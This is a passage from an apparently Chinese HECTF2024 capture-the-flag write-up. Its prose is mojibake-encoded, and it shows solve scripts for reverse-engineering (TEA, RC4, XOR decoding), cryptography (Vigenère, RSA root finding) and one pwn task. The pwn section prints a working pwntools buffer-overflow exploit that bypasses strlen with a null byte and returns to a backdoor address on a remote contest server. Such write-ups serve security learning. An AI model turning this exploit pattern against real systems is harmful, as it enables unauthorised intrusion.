src="/2024/12/12/HECTF2024/1733554900622-90918cfc-4363-4e25-9166-8da32613fa97.png" class="" title="img"><p>å‘ç°æ˜¯tea</p><img src="/2024/12/12/HECTF2024/1733554707733-3d4208ec-9a25-4e11-82f6-e1213727ecf2.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">int32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">1640531527</span>;<br>    <span class="hljs-type">uint32_t</span> sum = (<span class="hljs-number">-32</span>)*delta;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt;<span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x54434548</span>,<span class="hljs-number">0x32303246</span>,<span class="hljs-number">0x69617734</span>,<span class="hljs-number">0x756f7974</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0xdf596194</span>,<span class="hljs-number">0x2cfe74d6</span>,<span class="hljs-number">0x1355ae4d</span>,<span class="hljs-number">0xb6717a87</span>,<span class="hljs-number">0xf27bb57b</span>,<span class="hljs-number">0x8d436c5</span>,<span class="hljs-number">0xc5c8e1af</span>,<span class="hljs-number">0xa85bd8f</span>,<span class="hljs-number">0x19a70032</span>,<span class="hljs-number">0x400cfef4</span>,<span class="hljs-number">0xaf02e1fc</span>,<span class="hljs-number">0xcdedcfb4</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">12</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//HECTF&#123;58de01fc-af6b-8cf6-e8ca-db5964ce0b1e&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h2><p>æ‰¾åˆ°enc.pngï¼Œrc4è§£å¯†</p><img src="/2024/12/12/HECTF2024/1733555491063-0d9d2db9-e47d-4ed7-aab1-f6f1bafad97c.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">key, data</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    result = <span class="hljs-built_in">bytearray</span>()<br><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        t = (S[i] + S[j]) % <span class="hljs-number">256</span><br>        result.append(byte ^ S[t])<br><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    key = <span class="hljs-string">b&quot;HECTF&quot;</span><br>    input_file = <span class="hljs-string">&quot;enc.png&quot;</span><br>    output_file = <span class="hljs-string">&quot;right.txt&quot;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        encrypted_data = f.read()<br><br><br>    decrypted_data = rc4_decrypt(key, encrypted_data)<br><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decrypted_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è§£å¯†å®Œæˆï¼Œç»“æœå·²ä¿å­˜åˆ° <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åç¼€å¾—åˆ°png</p><img src="/2024/12/12/HECTF2024/1733555418759-f9a911c2-bdf1-45f6-a256-46b5a608c5d0.png" class="" title="img"><p>åˆ†æCheckActivity</p><img src="/2024/12/12/HECTF2024/1733555449158-86438d73-535e-4726-9da4-9f8ea7eaa6f6.png" class="" title="img"><p>d0funcä¸­åŠ è½½å†…å­˜å¹¶è°ƒç”¨funcå‡½æ•°ï¼Œæ³¨æ„å†…å­˜åˆå§‹å€¼è¢«ä¿®æ”¹äº†</p><img src="/2024/12/12/HECTF2024/1733573881631-b3a5c932-e123-4a7e-b322-3cdba779a4d8.png" class="" title="img"><p>äº¤å‰å¼•ç”¨æ‰¾åˆ°å¯†æ–‡</p><img src="/2024/12/12/HECTF2024/1733573974883-8fea21bd-1431-418e-842a-6e9264abe5c0.png" class="" title="img"><p>å’Œ51c8å¼‚æˆ–</p><img src="/2024/12/12/HECTF2024/1733574004765-46c448a7-8e8a-4df8-a621-1003f4c65ecd.png" class="" title="img"><p>åé¢æ˜¯æ ‡å‡†aes</p><img src="/2024/12/12/HECTF2024/1733567594718-ed693b3e-ac05-4220-81e6-dd664a5646d5.png" class="" title="img"><p>é€šè¿‡äº¤å‰å¼•ç”¨51c8æ‰¾åˆ°teaï¼Œå®é™…ä¸Šæ²¡ç”¨ï¼Œå› ä¸ºåœ¨aesåé¢</p><img src="/2024/12/12/HECTF2024/1733555402347-1d9a6c55-19db-4b69-a9f4-75c994fc1fcf.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x58</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x1A</span>,<br><span class="hljs-number">0x0C</span>, <span class="hljs-number">0x1B</span>,<br><span class="hljs-number">0x5E</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x40</span>,<br><span class="hljs-number">0x46</span>, <span class="hljs-number">0x06</span>,<br><span class="hljs-number">0x0A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x44</span>,<br><span class="hljs-number">0x0C</span>, <span class="hljs-number">0x56</span>,<br><span class="hljs-number">0x48</span>]<br>b5040=[<span class="hljs-number">0x15</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x48</span>,<br>  <span class="hljs-number">0x06</span>, <span class="hljs-number">0x19</span>, <br>  <span class="hljs-number">0x42</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x18</span>, <br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x0F</span>, <br>  <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x33</span>, <br>  <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x50</span>, <br>  <span class="hljs-number">0x41</span>]<br><br>key=<span class="hljs-string">&#x27;hectf2024&#x27;</span><br>flag1=<span class="hljs-string">&#x27;&#x27;</span><br>flag2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]+=<span class="hljs-number">1</span><br>    flag1+=<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)])^a[i])+<span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-built_in">print</span>(flag1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(b5040)):<br>    b5040[i]+=<span class="hljs-number">2</span><br>    b5040[i]^=<span class="hljs-number">0x18</span><br>    flag2+=<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)])^b5040[i])+<span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-built_in">print</span>(flag2)<br></code></pre></td></tr></table></figure><img src="/2024/12/12/HECTF2024/1733574131704-03dc1e0a-3c26-470f-9729-8dcc48782061.png" class="" title="img"><p>å»é™¤æœ€åä¸€ä¸ªç»“æŸç¬¦ç„¶åmd5</p><img src="/2024/12/12/HECTF2024/1733574157183-a4496e24-151f-47a7-83f2-19f905f8595b.png" class="" title="img"><h2 id="easyreee"><a href="#easyreee" class="headerlink" title="easyreee"></a>easyreee</h2><img src="/2024/12/12/HECTF2024/1733619671760-f1396e65-fff2-4c64-b7c0-f24847689d8d.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733619816739-e141e599-cc49-4fda-babc-c3d383f6c317.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733619807396-770022a3-5631-4531-8b1b-3808aca60161.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733621177457-52cbc597-8950-44e1-8c9c-858ae1e5e1b3.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">mi=[<span class="hljs-number">0x23</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x20</span>,<br> <span class="hljs-number">0x28</span>, <span class="hljs-number">0x25</span>,<br><span class="hljs-number">0x7E</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x46</span>,<br> <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>,<br><span class="hljs-number">0x4B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4C</span>,<br> <span class="hljs-number">0x03</span>, <span class="hljs-number">0x52</span>,<br><span class="hljs-number">0x04</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x4F</span>,<br> <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x4F</span>,<br><span class="hljs-number">0x7D</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x44</span>,<br> <span class="hljs-number">0x04</span>, <span class="hljs-number">0x4F</span>,<br><span class="hljs-number">0x49</span>, <span class="hljs-number">0x70</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(mi))<br><span class="hljs-comment"># a=[0]*2</span><br><span class="hljs-comment"># for k in range(0,255):</span><br><span class="hljs-comment">#     for i in range(0,2):</span><br><span class="hljs-comment">#         a[i]=(mi[i]^k)+21</span><br><span class="hljs-comment">#     shift=8</span><br><span class="hljs-comment">#     for i in range(2):</span><br><span class="hljs-comment">#         if a[i]&lt;=64 or a[i] &gt;=90:</span><br><span class="hljs-comment">#             if a[i]&gt;96 and a[i]&lt;=122:</span><br><span class="hljs-comment">#                 a[i]=(a[i]-97-shift)%26+97</span><br><span class="hljs-comment">#                 shift+=1</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             a[i] = (a[i] - 65 - shift) % 26 + 65</span><br><span class="hljs-comment">#             shift += 1</span><br><span class="hljs-comment">#     if a[0]==ord(&#x27;H&#x27;) and a[1]==ord(&#x27;E&#x27;):</span><br><span class="hljs-comment">#         print(k)</span><br><span class="hljs-comment"># k=24</span><br>shift=<span class="hljs-number">8</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mi)):<br>    mi[i]=(mi[i]^<span class="hljs-number">0x18</span>)+<span class="hljs-number">21</span><br>    <span class="hljs-keyword">if</span> mi[i]&lt;=<span class="hljs-number">64</span> <span class="hljs-keyword">or</span> mi[i] &gt;=<span class="hljs-number">90</span>:<br>        <span class="hljs-keyword">if</span> mi[i]&gt;<span class="hljs-number">96</span> <span class="hljs-keyword">and</span> mi[i]&lt;=<span class="hljs-number">122</span>:<br>            mi[i]=(mi[i]-<span class="hljs-number">97</span>-shift)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span><br>            shift+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        mi[i] = (mi[i] - <span class="hljs-number">65</span> - shift) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span><br>        shift += <span class="hljs-number">1</span><br>    flag+=<span class="hljs-built_in">chr</span>(mi[i])<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#HECTF&#123;Re_1s_s0_1nterest1ng&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><img src="/2024/12/12/HECTF2024/1733535381246-f1d2043f-180a-4c37-94e4-834b8967b61f.png" class="" title="img"><p>ç”¨\x00ç»•è¿‡strlenï¼Œç„¶året2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;8.153.107.216&#x27;</span>,<span class="hljs-number">30418</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br><br>back=<span class="hljs-number">0x401285</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">7</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xe</span>+p64(back)<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&quot;please sign in!!!!&quot;</span>,payload)<br>sa(<span class="hljs-string">&quot;Enter your key&quot;</span>,<span class="hljs-string">b&#x27;HECTF2024q&#x27;</span>)<br>inter()<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="è‰¾ç±³è‰"><a href="#è‰¾ç±³è‰" class="headerlink" title="è‰¾ç±³è‰"></a>è‰¾ç±³è‰</h2><p>ç»´å‰å°¼äºšresponsibilityä½œä¸ºå¯†é’¥+æ …æ </p><img src="/2024/12/12/HECTF2024/1733536379814-586697e1-6f65-412c-ba47-5edef0af81aa.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733535523199-43bca65c-6210-433b-92cd-765e8cf3f11e.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733536353388-37d8a3b0-b729-4780-befb-4ec704778dfa.png" class="" title="img"><h2 id="seven-more"><a href="#seven-more" class="headerlink" title="seven_more"></a>seven_more</h2><p>phiæ˜¯eçš„å€æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMyPrime</span>(<span class="hljs-params">nbits, multiplier</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        n = <span class="hljs-number">2</span> * multiplier * getPrime(nbits // <span class="hljs-number">2</span>) * getPrime(nbits // <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> is_prime(n + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> n + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_keys</span>(<span class="hljs-params">nbits</span>):<br>    p = getMyPrime(nbits, <span class="hljs-number">1009</span> * <span class="hljs-number">7</span>)<br>    q = getMyPrime(nbits, <span class="hljs-number">1009</span>)<br>    n = p * q<br>    e = <span class="hljs-number">1009</span> * <span class="hljs-number">7</span><br>    <span class="hljs-keyword">return</span> p, q, n, e<br><br>p, q, n, e = generate_keys(<span class="hljs-number">700</span>)<br><br>flag = <span class="hljs-string">b&#x27;HECTF&#123;######&#125;&#x27;</span> + os.urandom(<span class="hljs-number">101</span>)<br>m = bytes_to_long(flag)<br><span class="hljs-keyword">assert</span> m.bit_length() &lt; n.bit_length()<br><span class="hljs-keyword">assert</span> m.bit_length() &gt; q.bit_length()<br><span class="hljs-keyword">assert</span> m.bit_length() &gt; p.bit_length()<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q = <span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#n = 211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span><br><span class="hljs-comment">#c = 191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span><br><span class="hljs-comment">#p = 31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span><br><span class="hljs-comment">#q = 6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span><br>c = <span class="hljs-number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span><br>p = <span class="hljs-number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span><br>q = <span class="hljs-number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span><br>e=<span class="hljs-number">1009</span>*<span class="hljs-number">7</span><br><br>P.&lt;a&gt; = PolynomialRing(Zmod(p),implementation=<span class="hljs-string">&#x27;NTL&#x27;</span>)<br>f = a^e - c<br>mps = f.monic().roots(multiplicities = <span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(mps)<br><br>P.&lt;a&gt; = PolynomialRing(Zmod(q),implementation=<span class="hljs-string">&#x27;NTL&#x27;</span>)<br>f = a^e - c<br>mqs = f.monic().roots(multiplicities = <span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> mps:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> mqs:<br>        m = crt([<span class="hljs-built_in">int</span>(i),<span class="hljs-built_in">int</span>(j)],[p,q])<br>        flag = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;HECTF&#x27;</span> <span class="hljs-keyword">in</span> 